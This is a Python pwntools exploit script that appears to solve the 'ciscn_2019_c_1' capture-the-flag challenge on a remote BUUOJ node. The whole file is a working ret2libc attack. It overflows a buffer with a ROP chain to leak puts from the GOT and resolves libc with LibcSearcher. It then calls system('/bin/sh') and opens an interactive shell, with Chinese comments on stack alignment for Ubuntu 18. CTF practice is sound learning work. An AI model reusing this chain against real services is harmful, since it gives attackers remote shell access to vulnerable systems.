from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','29497')
e = ELF('./ciscn_2019_c_1')

pop_rdi = 0x400c83
ret_addr = 0x4006b9#这里是用来平等栈的，因为题目环境是Ubuntu18
#Ubuntu18调用system时要对齐栈，需要加一个ret来平衡，否则会crash。
puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = 0x58*'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols['main'])
io.sendlineafter("your choice!\n","1")
io.sendlineafter("to be encrypted\n",payload)

io.recvuntil("Ciphertext\n")
io.recvline()

puts_addr = u64(io.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
io.sendlineafter("your choice!\n","1")
# gdb.attach(io)
payload = 0x58 * 'a' + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
# 也可以多加几个ret，看出栈对齐的字节数。
io.sendlineafter("to be encrypted\n",payload)
io.recvuntil("Ciphertext\n")
io.recvline()
io.sendline('/bin/sh')
io.sendline(payload)
io.interactive()